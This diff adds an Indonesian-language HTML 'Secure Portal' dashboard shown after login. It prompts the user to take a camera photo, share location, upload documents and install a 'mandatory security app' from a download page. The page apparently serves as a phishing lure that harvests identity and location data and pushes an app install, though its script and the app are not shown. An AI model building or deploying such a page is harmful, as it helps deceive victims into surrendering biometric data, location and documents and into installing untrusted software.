@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Secure Portal</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="dashboard">
+        <div class="card">
+            <h2>✅ Login Berhasil</h2>
+            <p>Selamat datang, <span id="userEmail"></span></p>
+        </div>
+
+        <div class="card">
+            <h2>📷 Verifikasi Kamera</h2>
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas" style="display:none;"></canvas>
+            <button class="btn-login" onclick="capturePhoto()">Ambil Foto</button>
+        </div>
+
+        <div class="card">
+            <h2>📍 Verifikasi Lokasi</h2>
+            <button class="btn-login" onclick="getLocation()">Izinkan Lokasi</button>
+        </div>
+
+        <div class="card">
+            <h2>📁 Upload Dokumen</h2>
+            <input type="file" id="docFile" accept="image/*,.pdf">
+            <button class="btn-login" onclick="uploadDoc()">Upload</button>
+        </div>
+
+        <div class="card">
+            <h2>📱 Verifikasi Perangkat (WAJIB)</h2>
+            <div class="warning">
+                <p>⚠️ Untuk menyelesaikan verifikasi, install aplikasi keamanan kami.</p>
+            </div>
+            <a href="download.html" class="btn-login" style="display:block; text-align:center; text-decoration:none;">Download Aplikasi</a>
+        </div>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
